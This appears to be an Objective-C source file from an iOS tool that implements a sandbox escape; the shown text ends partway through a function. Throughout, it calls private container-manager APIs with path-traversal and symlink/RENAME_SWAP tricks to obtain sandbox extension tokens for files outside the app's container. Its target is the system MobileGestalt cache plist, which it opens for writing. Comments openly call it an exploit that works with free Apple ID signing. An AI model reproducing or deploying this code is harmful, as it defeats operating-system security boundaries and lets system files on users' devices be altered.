#import "BQCore.h"
#import <dlfcn.h>
#import <zlib.h>
#import <CoreFoundation/CoreFoundation.h>
#import <sys/stat.h>
#import <sys/mount.h>
#import <sys/fsgetpath.h>
#import <sys/stdio.h>
#import <dirent.h>
#import <fcntl.h>
#import <unistd.h>
#import <errno.h>
#import <string.h>
#import <stdlib.h>
#import <objc/message.h>
#import <WebKit/WebKit.h>

NSString * const BQErrorDomain = @"BQErrorDomain";

static NSString * const kMGGroup = @"systemgroup.com.apple.mobilegestaltcache";
static NSString * const kMGCaches = @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
static NSString * const kPBCollections = @"com.apple.WallpaperKit.CollectionsPoster";
static NSString * const kPBCollectionsModern = @"com.apple.Posters.CollectionsPosterApp";
static NSString * const kPBMercury = @"com.apple.MercuryPoster";
static NSString * const kPBPhotos = @"com.apple.PhotosUIPrivate.PhotosPosterProvider";
static NSString * const kPBExtVersion = @"61";

// ---------------------------------------------------------------- logging ---
static NSString *gLogPath;
static NSLock *gLogLock;
static NSString *gGroupRoot;
static NSString *gGroupID;
static NSArray<NSString *> *gGroupIDs;
static NSString *gEscapeGroupRoot;
static int gTraversalState; // 0 unknown, 1 works, -1 unsupported
static BOOL gClass2ParentEnabled;
static NSString *gClass2SubpathLink;
static dispatch_queue_t gWorkQueue;
static void bq_recover_class2_swap(void);
static void bq_recover_class2_lib_swap(void);

BOOL BQClass2ParentEnabled(void) { return gClass2ParentEnabled; }

void BQSetClass2ParentEnabled(BOOL on) {
    gClass2ParentEnabled = on;
    [[NSUserDefaults standardUserDefaults] setBool:on forKey:@"BQClass2ParentEnabled"];
    [[NSUserDefaults standardUserDefaults] synchronize];
    BQLog(@"class2-parent enabled=%d", on);
}

NSString *BQLogPath(void) {
    if (!gLogPath) {
        NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        gLogPath = [docs stringByAppendingPathComponent:@"bqtool.log"];
    }
    return gLogPath;
}

void BQLog(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[bqtool] %@", s);
    static dispatch_once_t once;
    dispatch_once(&once, ^{ gLogLock = [NSLock new]; });
    [gLogLock lock];
    NSString *path = BQLogPath();
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:path]) [fm createFileAtPath:path contents:nil attributes:nil];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (fh) {
        @try {
            [fh seekToEndOfFile];
            [fh writeData:[[s stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
            [fh synchronizeFile];
        } @catch (__unused NSException *e) {}
        [fh closeFile];
    }
    [gLogLock unlock];
}

NSString *BQDocuments(void) {
    return [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
}

NSString *BQGroupID(void) {
    if (!gGroupID) {
        // Read the app's own entitlements via SecTask. This lets the exploit use
        // whatever app group the running build actually has, instead of a
        // hardcoded identifier.
        void *sec = dlopen("/System/Library/Frameworks/Security.framework/Security", RTLD_NOW);
        typedef CFTypeRef (*create_fn)(CFAllocatorRef);
        typedef CFTypeRef (*copy_ent_fn)(CFTypeRef, CFStringRef, CFErrorRef *);
        create_fn create = (create_fn)dlsym(RTLD_DEFAULT, "SecTaskCreateFromSelf");
        if (!create && sec) create = (create_fn)dlsym(sec, "SecTaskCreateFromSelf");
        copy_ent_fn copy = (copy_ent_fn)dlsym(RTLD_DEFAULT, "SecTaskCopyValueForEntitlement");
        if (!copy && sec) copy = (copy_ent_fn)dlsym(sec, "SecTaskCopyValueForEntitlement");
        if (create && copy) {
            CFTypeRef task = create(kCFAllocatorDefault);
            if (task) {
                CFTypeRef val = copy(task, CFSTR("com.apple.security.application-groups"), NULL);
                if (val && CFGetTypeID(val) == CFArrayGetTypeID()) {
                    CFArrayRef arr = (CFArrayRef)val;
                    NSMutableArray *all = [NSMutableArray array];
                    for (CFIndex i = 0; i < CFArrayGetCount(arr); i++) {
                        CFTypeRef x = CFArrayGetValueAtIndex(arr, i);
                        if (x && CFGetTypeID(x) == CFStringGetTypeID()) {
                            [all addObject:[(__bridge NSString *)x copy]];
                        }
                    }
                    if (all.count) {
                        gGroupIDs = [all copy];
                        gGroupID = all.firstObject;
                    }
                }
                if (val) CFRelease(val);
                CFRelease(task);
            }
        }
        BQLog(@"app group entitlement: %@", gGroupID ?: @"(none)");
    }
    return gGroupID;
}

NSString *BQGroupRoot(void) {
    if (!gGroupRoot) {
        NSString *group = BQGroupID();
        if (group.length) {
            NSURL *u = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:group];
            gGroupRoot = u.path;
        }
    }
    return gGroupRoot;
}

NSArray<NSString *> *BQGroupIDs(void) {
    BQGroupID();
    return gGroupIDs ?: @[];
}

dispatch_queue_t BQWorkQueue(void) {
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        gWorkQueue = dispatch_queue_create("com.bqtool.work", DISPATCH_QUEUE_SERIAL);
    });
    return gWorkQueue;
}

// --------------------------------------------------------------- MCM API ---
typedef void *xpc_object_t;
typedef xpc_object_t (*xpc_string_create_fn)(const char *);
typedef void (*xpc_release_fn)(xpc_object_t);
typedef void *(*fn_create)(void);
typedef void (*fn_set_u64)(void *, uint64_t);
typedef void (*fn_set_obj)(void *, xpc_object_t);
typedef void (*fn_set_cstr)(void *, const char *);
typedef void *(*fn_get_one)(void *);
typedef char *(*fn_copy_str)(void *);
typedef const char *(*fn_get_path)(void *);
typedef void (*fn_free)(void *);
typedef int64_t (*fn_consume)(const char *);
typedef int64_t (*fn_release)(int64_t);
typedef void *(*fn_err)(void *);
typedef const char *(*fn_err_msg)(void *);
typedef int (*fn_err_int)(void *);

typedef struct {
    void *h;
    fn_create create;
    fn_set_u64 set_class;
    fn_set_obj set_ids;
    fn_set_obj set_group_ids;
    fn_set_u64 set_flags;
    fn_set_u64 set_part;
    fn_set_cstr set_domain;
    fn_get_one get_one;
    fn_copy_str copy_token;
    fn_get_path get_path;
    fn_free query_free;
    fn_consume consume;
    fn_release release;
    fn_err last_error;
    fn_err_msg err_message;
    fn_err_int err_posix;
} mcm_t;

static mcm_t g;
static xpc_string_create_fn p_xpc_string_create;
static xpc_release_fn p_xpc_release;

static void *bq_sym(void *h, const char *a, const char *b) {
    void *p = dlsym(h, a);
    if (!p && b) p = dlsym(h, b);
    return p;
}

static void bq_load_mcm(void) {
    if (g.create) return;
    memset(&g, 0, sizeof(g));
    g.h = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!g.h) {
        BQLog(@"dlopen MCM failed: %s", dlerror());
        return;
    }
    g.create = (fn_create)bq_sym(g.h, "container_query_create", NULL);
    g.set_class = (fn_set_u64)bq_sym(g.h, "container_query_set_class", NULL);
    g.set_ids = (fn_set_obj)bq_sym(g.h, "container_query_set_identifiers", NULL);
    g.set_group_ids = (fn_set_obj)bq_sym(g.h, "container_query_set_group_identifiers", NULL);
    g.set_flags = (fn_set_u64)bq_sym(g.h, "container_query_operation_set_flags", "container_query_set_flags");
    g.set_part = (fn_set_u64)bq_sym(g.h, "container_query_operation_set_part", "container_query_set_part");
    g.set_domain = (fn_set_cstr)bq_sym(g.h, "container_query_operation_set_part_domain", "container_query_set_part_domain");
    g.get_one = (fn_get_one)bq_sym(g.h, "container_query_get_single_result", NULL);
    g.copy_token = (fn_copy_str)bq_sym(g.h, "container_copy_sandbox_token", NULL);
    g.get_path = (fn_get_path)bq_sym(g.h, "container_object_get_path", NULL);
    g.query_free = (fn_free)bq_sym(g.h, "container_query_free", NULL);
    g.consume = (fn_consume)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    g.release = (fn_release)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    g.last_error = (fn_err)bq_sym(g.h, "container_query_get_last_error", NULL);
    g.err_message = (fn_err_msg)bq_sym(g.h, "container_error_get_message", NULL);
    g.err_posix = (fn_err_int)bq_sym(g.h, "container_error_get_posix_errno", NULL);
    p_xpc_string_create = (xpc_string_create_fn)dlsym(RTLD_DEFAULT, "xpc_string_create");
    p_xpc_release = (xpc_release_fn)dlsym(RTLD_DEFAULT, "xpc_release");
    BQLog(@"MCM loaded=%d create=%p get=%p token=%p consume=%p release=%p",
          g.h != NULL, g.create, g.get_one, g.copy_token, g.consume, g.release);
}

static void bq_log_query_error(void *q, NSString *where) {
    if (!q || !g.last_error) return;
    void *e = g.last_error(q);
    if (!e) return;
    int posix = g.err_posix ? g.err_posix(e) : 0;
    const char *msg = g.err_message ? g.err_message(e) : NULL;
    BQLog(@"%@: last_error posix=%d msg=%s", where, posix, msg ? msg : "(null)");
}

// ---------------------------------------------------------- fs primitives ---
static void bq_recover(NSString *path, NSString *bak) {
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:bak]) return;
    [fm removeItemAtPath:path error:nil];
    NSError *e = nil;
    if (![fm moveItemAtPath:bak toPath:path error:&e]) {
        BQLog(@"recover %@ -> %@ failed: %@", bak, path, e);
    }
}

static BOOL bq_swap_path(NSString *path, NSString *target, NSString *bak) {
    NSFileManager *fm = [NSFileManager defaultManager];
    [fm removeItemAtPath:bak error:nil];
    if ([fm fileExistsAtPath:path]) {
        NSError *e = nil;
        if (![fm moveItemAtPath:path toPath:bak error:&e]) {
            BQLog(@"swap move %@ -> %@ failed: %@", path, bak, e);
            return NO;
        }
    }
    unlink(path.fileSystemRepresentation);
    errno = 0;
    int r = symlink(target.fileSystemRepresentation, path.fileSystemRepresentation);
    if (r != 0) {
        BQLog(@"symlink %@ -> %@ failed errno=%d (%s)", path, target, errno, strerror(errno));
        if ([fm fileExistsAtPath:bak]) [fm moveItemAtPath:bak toPath:path error:nil];
        return NO;
    }
    return YES;
}

static void bq_restore_path(NSString *path, NSString *bak) {
    NSFileManager *fm = [NSFileManager defaultManager];
    if ([fm fileExistsAtPath:bak]) {
        [fm removeItemAtPath:path error:nil];
        NSError *e = nil;
        if (![fm moveItemAtPath:bak toPath:path error:&e]) {
            BQLog(@"restore %@ -> %@ failed: %@", bak, path, e);
        }
    } else {
        if ([fm fileExistsAtPath:path]) {
            struct stat st;
            if (lstat(path.fileSystemRepresentation, &st) == 0 && S_ISLNK(st.st_mode)) {
                [fm removeItemAtPath:path error:nil];
            }
        }
        if (![fm fileExistsAtPath:path]) {
            [fm createDirectoryAtPath:path withIntermediateDirectories:YES attributes:nil error:nil];
        }
    }
}

// Public wrapper for the inode-walking enumerator.
NSArray<NSString *> *BQListChildren(NSString *parent, int64_t maxInode);

// bad_query_list-style inode enumeration.
static char *bq_list(const char *path, int64_t max_inode) {
    struct statfs sfs;
    if (statfs(path, &sfs) != 0) return NULL;
    fsid_t fsid = sfs.f_fsid;
    size_t cap = 65536, length = 0, path_length = strlen(path);
    char *out = malloc(cap);
    if (!out) return NULL;
    out[0] = '\0';
    char buf[1200];
    for (uint64_t ino = 1; ino <= (uint64_t)max_inode; ino++) {
        ssize_t n = fsgetpath(buf, sizeof(buf), &fsid, ino);
        if (n <= 0) continue;
        const char *p = buf;
        if (strncmp(p, "/private/var/", 13) == 0) p += 8;
        if (strncmp(p, path, path_length) != 0 || p[path_length] != '/') continue;
        if (strchr(p + path_length + 1, '/')) continue;
        size_t need = strlen(p) + 2;
        if (length + need > cap) {
            cap *= 2;
            char *t = realloc(out, cap);
            if (!t) break;
            out = t;
        }
        length += snprintf(out + length, cap - length, "%s\n", p);
    }
    return out;
}

NSArray<NSString *> *BQListChildren(NSString *parent, int64_t maxInode) {
    if (!parent.length) return @[];
    if (maxInode <= 0) maxInode = 400000;
    // bq_list strips /private from fsgetpath output, so pass /var/... form.
    NSString *key = parent;
    if ([key hasPrefix:@"/private/var/"]) key = [@"/var/" stringByAppendingString:[key substringFromIndex:13]];
    char *list = bq_list(key.fileSystemRepresentation, maxInode);
    if (!list) return @[];
    NSString *all = [NSString stringWithUTF8String:list];
    free(list);
    NSMutableArray *out = [NSMutableArray new];
    for (NSString *line in [all componentsSeparatedByString:@"\n"]) {
        if (line.length) [out addObject:line];
    }
    return out;
}

// ------------------------------------------------------------------ init ---
BOOL BQCoreInit(void) {
    static dispatch_once_t once;
    static BOOL ok = NO;
    dispatch_once(&once, ^{
        NSString *docs = BQDocuments();
        [[NSFileManager defaultManager] createDirectoryAtPath:[docs stringByAppendingPathComponent:@"tendies"]
                                  withIntermediateDirectories:YES attributes:nil error:nil];
        [[NSFileManager defaultManager] createDirectoryAtPath:[docs stringByAppendingPathComponent:@"PosterBoard/Wallpapers"]
                                  withIntermediateDirectories:YES attributes:nil error:nil];
        if (gLogPath) [[NSFileManager defaultManager] createFileAtPath:gLogPath contents:nil attributes:nil];
        NSUserDefaults *defs = [NSUserDefaults standardUserDefaults];
        bq_recover_class2_swap();
        bq_recover_class2_lib_swap();
        gClass2ParentEnabled = [defs boolForKey:@"BQClass2ParentEnabled"];
        if (gClass2ParentEnabled && [defs boolForKey:@"BQClass2ParentCrashGuard"]) {
            gClass2ParentEnabled = NO;
            [defs setBool:NO forKey:@"BQClass2ParentEnabled"];
            [defs setBool:NO forKey:@"BQClass2ParentCrashGuard"];
            [defs synchronize];
            BQLog(@"class2-parent disabled after a previous attempt did not finish");
        } else if (gClass2ParentEnabled) {
            [defs setBool:YES forKey:@"BQClass2ParentCrashGuard"];
            [defs synchronize];
        } else {
            [defs setBool:NO forKey:@"BQClass2ParentCrashGuard"];
        }
        BQLog(@"=== BQEscape start | iOS %@ | bundle %@ ===",
              [UIDevice currentDevice].systemVersion, [[NSBundle mainBundle] bundleIdentifier]);
        bq_load_mcm();
        NSString *gid = BQGroupID();
        NSString *root = BQGroupRoot();
        BQLog(@"app group: id=%@ root=%@", gid ?: @"(none)", root ?: @"(none)");
        ok = (g.create && g.get_one && g.copy_token && g.consume && g.release);
        BQLog(@"core init ok=%d", ok);
    });
    return ok;
}

// ---------------------------------------------------------------- escape ---
static NSString *bq_dots(int n) {
    NSMutableArray *a = [NSMutableArray array];
    for (int i = 0; i < n; i++) [a addObject:@".."];
    return [a componentsJoinedByString:@"/"];
}

static int64_t bq_query_escape(uint64_t cls, NSString *ident, BOOL group,
                               uint64_t part, NSString *domain, uint64_t flags,
                               NSString *label, NSString **outPath) {
    if (!g.create || !ident.length) return -1;
    void *q = g.create();
    if (!q) return -2;
    g.set_class(q, cls);
    xpc_object_t x = p_xpc_string_create ? p_xpc_string_create(ident.UTF8String) : NULL;
    if (group && g.set_group_ids) g.set_group_ids(q, x);
    else if (g.set_ids) g.set_ids(q, x);
    else if (g.set_group_ids) g.set_group_ids(q, x);
    if (g.set_part) g.set_part(q, part);
    if (domain.length && g.set_domain) g.set_domain(q, domain.UTF8String);
    if (g.set_flags) g.set_flags(q, flags);
    if (x && p_xpc_release) p_xpc_release(x);

    void *res = g.get_one(q);
    NSString *path = nil;
    if (res && g.get_path) {
        const char *cp = g.get_path(res);
        if (cp) path = [NSString stringWithUTF8String:cp];
    }
    char *tok = (res && g.copy_token) ? g.copy_token(res) : NULL;
    int64_t h = (tok && g.consume) ? g.consume(tok) : -5;
    BQLog(@"strategy %@: cls=%llu ident=%@ part=%llu result=%p path=%@ token=%s consume=%lld",
          label, cls, ident, part, res, path ?: @"(null)", tok ? "YES" : "NO", (long long)h);
    if (!res) bq_log_query_error(q, label);
    if (tok) free(tok);
    g.query_free(q);
    if (h >= 0 && outPath) *outPath = path;
    return h;
}

// Class 2 (the app's own data container) has one more door: the sandbox
// refuses to rename the part directories themselves (Library/Caches, Documents,
// tmp, ...), but the parent Library directory can be renamed on some builds.
// Move it aside, recreate a small Library with a symlinked Caches, query class 2
// and restore the original Library immediately. The token remains valid for the
// resolved target.
// Class 2 subpath symlink: create a symlink inside the app's own
// Library/Caches and ask MCM for part 3 with a non-empty partDomain. This
// keeps Library in place (no process-killing rename) and may make the daemon
// resolve the symlink while issuing the extension. Safe to attempt: only a
// temporary symlink inside Caches is touched.
static int64_t bq_escape_class2_subpath(NSString *target, NSString **linkOut) {
    NSString *home = NSHomeDirectory();
    NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
    if (!home.length || !bid.length) return -6;
    if (!g.set_domain) return -1;
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *caches = [[home stringByAppendingPathComponent:@"Library"] stringByAppendingPathComponent:@"Caches"];
    [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:nil];
    NSString *leaf = [NSString stringWithFormat:@".bq_link_%d", getpid()];
    NSString *link = [caches stringByAppendingPathComponent:leaf];
    unlink(link.fileSystemRepresentation);
    if (symlink(target.fileSystemRepresentation, link.fileSystemRepresentation) != 0) {
        BQLog(@"class2-subpath: symlink failed errno=%d (%s)", errno, strerror(errno));
        return -2;
    }

    NSArray *domains = @[
        leaf,
        [@"Caches/" stringByAppendingString:leaf],
        [@"Library/Caches/" stringByAppendingString:leaf],
    ];
    int64_t last = -1;
    for (NSString *domain in domains) {
        NSString *path = nil;
        int64_t h = bq_query_escape(2, bid, NO, 3, domain, 0x8000000000ULL,
                                    [@"class2-subpath-" stringByAppendingString:domain], &path);
        if (h >= 0) {
            // A token for the symlink path is not enough: the editor needs the
            // resolved target. Verify before reporting success.
            DIR *d = opendir(target.fileSystemRepresentation);
            if (!d) {
                BQLog(@"class2-subpath: token did not open target (%@)", path ?: @"(null)");
                if (g.release) g.release(h);
                last = -5;
                continue;
            }
            closedir(d);
            unlink(link.fileSystemRepresentation);
            if (linkOut) *linkOut = target;
            BQLog(@"escape: using class2 subpath (%@) path=%@", domain, path ?: @"(null)");
            return h;
        }
        last = h;
    }
    unlink(link.fileSystemRepresentation);
    return last;
}

// Swap Library/Caches with a symlink using renameatx_np(RENAME_SWAP). Unlike a
// plain rename, this may not require file-write-unlink on the part directory.
// It never moves Library, so it cannot trigger the 2.2 process kill.
static NSString *bq_class2_swap_temp(void) {
    return [[NSHomeDirectory() stringByAppendingPathComponent:@"Library"] stringByAppendingPathComponent:@".bq_cache_link"];
}

static NSString *bq_class2_lib_stage(void) {
    return [NSHomeDirectory() stringByAppendingPathComponent:@".bq_lib_swap"];
}

static void bq_recover_class2_lib_swap(void) {
    NSString *home = NSHomeDirectory();
    if (!home.length) return;
    NSString *lib = [home stringByAppendingPathComponent:@"Library"];
    NSString *stage = bq_class2_lib_stage();
    NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];
    struct stat st, ts;
    if (lstat(caches.fileSystemRepresentation, &st) == 0 && S_ISLNK(st.st_mode) &&
        lstat(stage.fileSystemRepresentation, &ts) == 0) {
        if (renameatx_np(AT_FDCWD, lib.fileSystemRepresentation,
                         AT_FDCWD, stage.fileSystemRepresentation, RENAME_SWAP) == 0) {
            [[NSFileManager defaultManager] removeItemAtPath:stage error:nil];
            BQLog(@"class2-library-swap: recovered interrupted swap");
        }
    } else if (lstat(stage.fileSystemRepresentation, &ts) == 0) {
        [[NSFileManager defaultManager] removeItemAtPath:stage error:nil];
    }
}

// Atomic Library swap: replace Library with a staging directory whose Caches
// entry points at the target and whose other entries symlink back to the real
// Library (which moves to the staging path during the swap). This keeps
// NSUserDefaults and friends alive, unlike the older move-based fallback.
static int64_t bq_escape_class2_library_swap(NSString *target, NSString **linkOut) {
    NSString *home = NSHomeDirectory();
    NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
    if (!home.length || !bid.length) return -6;
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *lib = [home stringByAppendingPathComponent:@"Library"];
    NSString *stage = bq_class2_lib_stage();

    bq_recover_class2_lib_swap();
    [fm removeItemAtPath:stage error:nil];
    if (![fm fileExistsAtPath:lib]) return -2;
    if (![fm createDirectoryAtPath:stage withIntermediateDirectories:YES attributes:nil error:nil]) return -2;

    // Symlink every original Library child into the staging dir. After the
    // swap, the staging path holds the real Library, so these resolve back.
    for (NSString *child in [fm contentsOfDirectoryAtPath:lib error:nil]) {
        if ([child isEqualToString:@"Caches"]) continue;
        NSString *newChild = [stage stringByAppendingPathComponent:child];
        symlink(newChild.fileSystemRepresentation, newChild.fileSystemRepresentation);
    }
    NSString *stageCaches = [stage stringByAppendingPathComponent:@"Caches"];
    if (symlink(target.fileSystemRepresentation, stageCaches.fileSystemRepresentation) != 0) {
        [fm removeItemAtPath:stage error:nil];
        return -2;
    }

    if (renameatx_np(AT_FDCWD, lib.fileSystemRepresentation,
                     AT_FDCWD, stage.fileSystemRepresentation, RENAME_SWAP) != 0) {
        BQLog(@"class2-library-swap: RENAME_SWAP failed errno=%d (%s)", errno, strerror(errno));
        [fm removeItemAtPath:stage error:nil];
        return -2;
    }

    NSString *path = nil;
    int64_t h = bq_query_escape(2, bid, NO, 3, @"", 0x8000000000ULL, @"class2-library-swap", &path);
    if (h >= 0) {
        DIR *d = opendir(target.fileSystemRepresentation);
        if (!d) {
            BQLog(@"class2-library-swap: token did not open target (%@)", path ?: @"(null)");
            if (g.release) g.release(h);
            h = -5;
        } else {
            closedir(d);
        }
    }

    if (renameatx_np(AT_FDCWD, lib.fileSystemRepresentation,
                     AT_FDCWD, stage.fileSystemRepresentation, RENAME_SWAP) != 0) {
        BQLog(@"class2-library-swap: swap back failed errno=%d (%s)", errno, strerror(errno));
    }
    [fm removeItemAtPath:stage error:nil];

    if (h >= 0) {
        if (linkOut) *linkOut = target;
        BQLog(@"escape: using class2 library swap");
        return h;
    }
    return h;
}

static void bq_recover_class2_swap(void) {
    NSString *home = NSHomeDirectory();
    if (!home.length) return;
    NSString *caches = [[home stringByAppendingPathComponent:@"Library"] stringByAppendingPathComponent:@"Caches"];
    NSString *temp = bq_class2_swap_temp();
    struct stat st, ts;
    if (lstat(caches.fileSystemRepresentation, &st) == 0 && S_ISLNK(st.st_mode) &&
        lstat(temp.fileSystemRepresentation, &ts) == 0) {
        if (renameatx_np(AT_FDCWD, caches.fileSystemRepresentation,
                         AT_FDCWD, temp.fileSystemRepresentation, RENAME_SWAP) == 0) {
            unlink(temp.fileSystemRepresentation);
            BQLog(@"class2-swap: recovered interrupted swap");
        }
    } else if (lstat(temp.fileSystemRepresentation, &ts) == 0 && S_ISLNK(ts.st_mode)) {
        unlink(temp.fileSystemRepresentation);
    }
}

// Exact bad_query form used by GestaltEdit on iOS 27: class 13, MG SystemGroup,
// part 3, an 8-level traversal to the plist file, and flags 0x8000000000
// (extension type only, no include-path bit). This is the form that works with
// free Apple ID signatures on supported 27.x builds.
static int64_t bq_escape_bad_query_file(NSString *caches, NSString **linkOut) {
    NSString *file1 = [caches stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
    NSString *file2 = [file1 hasPrefix:@"/private/var/"]
        ? [@"/var/" stringByAppendingString:[file1 substringFromIndex:@"/private/var/".length]]
        : file1;
    int64_t last = -1;
    for (NSString *file in @[file2, file1]) {
        if (![file isAbsolutePath]) continue;
        NSString *dom = [bq_dots(8) stringByAppendingString:file];
        NSString *path = nil;
        int64_t h = bq_query_escape(13, kMGGroup, YES, 3, dom, 0x8000000000ULL,
                                    @"bad_query-file", &path);
        if (h < 0) {
            last = h;
            continue;
        }
        int fd = open(file.fileSystemRepresentation, O_RDWR | O_CLOEXEC);
        if (fd >= 0) {
            close(fd);
            if (linkOut) *linkOut = file;
            BQLog(@"escape: using bad_query file -> %@", file);
            return h;
        }
        BQLog(@"bad_query-file: token did not open %@ errno=%d", file, errno);
        if (g.release) g.release(h);
        last = -5;
    }
    return last;
}

static NSString *bq_query_path_only(uint64_t cls, NSString *ident, BOOL group, uint64_t part, uint64_t flags) {
    if (!g.create || !ident.length) return nil;
    void *q = g.create();
    if (!q) return nil;
    g.set_class(q, cls);
    xpc_object_t x = p_xpc_string_create ? p_xpc_string_create(ident.UTF8String) : NULL;
    if (group && g.set_group_ids) g.set_group_ids(q, x);
    else if (g.set_ids) g.set_ids(q, x);
    else if (g.set_group_ids) g.set_group_ids(q, x);
    if (g.set_part) g.set_part(q, part);
    if (g.set_flags) g.set_flags(q, flags);
    if (x && p_xpc_release) p_xpc_release(x);
    void *res = g.get_one(q);
    NSString *path = nil;
    if (res && g.get_path) {
        const char *cp = g.get_path(res);
        if (cp) path = [NSString stringWithUTF8String:cp];
    }
    g.query_free(q);
    return path;
}

// Class 12 held com.apple.geod as a built-in allowed container. The traversal
// was patched, but a direct part-3 query may still issue a token to an ordinary
// app. Use geod's writable Library/Caches as the symlink base for the target.
static int64_t bq_escape_geod_symlink(NSString *target, NSString **linkOut) {
    NSString *gid = @"com.apple.geod";
    NSString *caches = bq_query_path_only(12, gid, NO, 3, 0x100000000ULL);
    if (!caches.length) {
        NSString *root = bq_query_path_only(12, gid, NO, 0, 0x100000000ULL);
        if (root.length) caches = [root stringByAppendingPathComponent:@"Library/Caches"];
    }
    if (!caches.length) return -2;
    if ([caches hasPrefix:@"/var/"]) caches = [@"/private" stringByAppendingString:caches];

    NSArray *flags = @[@0x8000000000ULL, @0x0800000000ULL, @0x8100000000ULL];
    int64_t h1 = -1;
    uint64_t useFlags = 0;
    NSString *path = nil;
    for (NSNumber *n in flags) {
        h1 = bq_query_escape(12, gid, NO, 3, @"", n.unsignedLongLongValue,
                             [NSString stringWithFormat:@"class12-geod-direct-%@", n], &path);
        if (h1 >= 0) { useFlags = n.unsignedLongLongValue; break; }
    }
    if (h1 < 0) return h1;

    [[NSFileManager defaultManager] createDirectoryAtPath:caches.stringByDeletingLastPathComponent
                                 withIntermediateDirectories:YES attributes:nil error:nil];
    DIR *d = opendir(caches.fileSystemRepresentation);
    if (!d) {
        BQLog(@"geod: token did not open %@ errno=%d", caches, errno);
        if (g.release) g.release(h1);
        return -5;
    }
    closedir(d);

    NSString *bak = [caches stringByAppendingString:@".bqgeod"];
    bq_recover(caches, bak);
    if (!bq_swap_path(caches, target, bak)) {
        bq_restore_path(caches, bak);
        if (g.release) g.release(h1);
        return -2;
    }

    NSString *path2 = nil;
    int64_t h2 = bq_query_escape(12, gid, NO, 3, @"", useFlags,
                                 @"class12-geod-symlink", &path2);
    if (h2 >= 0) {
        DIR *d2 = opendir(target.fileSystemRepresentation);
        if (!d2) {
            BQLog(@"geod: symlink token did not open target");
            if (g.release) g.release(h2);
            h2 = -5;
        } else {
            closedir(d2);
        }
    }
    bq_restore_path(caches, bak);
    if (g.release) g.release(h1);
    if (h2 >= 0) {
        if (linkOut) *linkOut = target;
        BQLog(@"escape: using geod class12 symlink -> %@", target);
        return h2;
    }
    return h2;
}

static int64_t bq_escape_class2_swap(NSString *target, NSString **linkOut) {
    NSString *home = NSHomeDirectory();
    NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
    if (!home.length || !bid.length) return -6;
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *lib = [home stringByAppendingPathComponent:@"Library"];
    NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];
    NSString *temp = bq_class2_swap_temp();
    [fm createDirectoryAtPath:lib withIntermediateDirectories:YES attributes:nil error:nil];

    bq_recover_class2_swap();
    unlink(temp.fileSystemRepresentation);
    if (symlink(target.fileSystemRepresentation, temp.fileSystemRepresentation) != 0) return -2;

    if (renameatx_np(AT_FDCWD, caches.fileSystemRepresentation,
                     AT_FDCWD, temp.fileSystemRepresentation, RENAME_SWAP) != 0) {
        BQLog(@"class2-swap: RENAME_SWAP failed errno=%d (%s)", errno, strerror(errno));
        unlink(temp.fileSystemRepresentation);
        return -2;
    }

    NSString *path = nil;
    int64_t h = bq_query_escape(2, bid, NO, 3, @"", 0x8000000000ULL, @"class2-swap", &path);
    if (h >= 0) {
        DIR *d = opendir(target.fileSystemRepresentation);
        if (!d) {
            BQLog(@"class2-swap: token did not open target (%@)", path ?: @"(null)");
            if (g.release) g.release(h);
            h = -5;
        } else {
            closedir(d);
        }
    }

    // Swap back: Caches becomes the original directory, temp becomes the symlink.
    if (renameatx_np(AT_FDCWD, caches.fileSystemRepresentation,
                     AT_FDCWD, temp.fileSystemRepresentation, RENAME_SWAP) != 0) {
        BQLog(@"class2-swap: swap back failed errno=%d (%s)", errno, strerror(errno));
    }
    unlink(temp.fileSystemRepresentation);

    if (h >= 0) {
        if (linkOut) *linkOut = target;
        BQLog(@"escape: using class2 swap");
        return h;
    }
    return h;
}

// Class 2 staged symlink: put a tiny fake tree inside the app's own
// Library/Caches, then use partDomain so MCM appends "Library/Caches" behind a
// symlink that resolves to the target. No Library move and no app group.
static int64_t bq_escape_class2_stage(NSString *target, NSString **linkOut) {
    NSString *home = NSHomeDirectory();
    NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
    if (!home.length || !bid.length || !g.set_domain) return -6;
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *caches = [[home stringByAppendingPathComponent:@"Library"] stringByAppendingPathComponent:@"Caches"];
    [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:nil];
    NSString *tag = [NSString stringWithFormat:@".bq_stage_%d", getpid()];
    NSString *stage = [caches stringByAppendingPathComponent:tag];
    NSString *link = [caches stringByAppendingPathComponent:
                      [NSString stringWithFormat:@".bq_slink_%d", getpid()]];
    NSString *stageLib = [stage stringByAppendingPathComponent:@"Library"];
    NSString *stageCaches = [stageLib stringByAppendingPathComponent:@"Caches"];

    [fm removeItemAtPath:stage error:nil];
    unlink(link.fileSystemRepresentation);
    if (![fm createDirectoryAtPath:stageLib withIntermediateDirectories:YES attributes:nil error:nil]) return -2;
    if (symlink(target.fileSystemRepresentation, stageCaches.fileSystemRepresentation) != 0) {
        [fm removeItemAtPath:stage error:nil];
        return -2;
    }
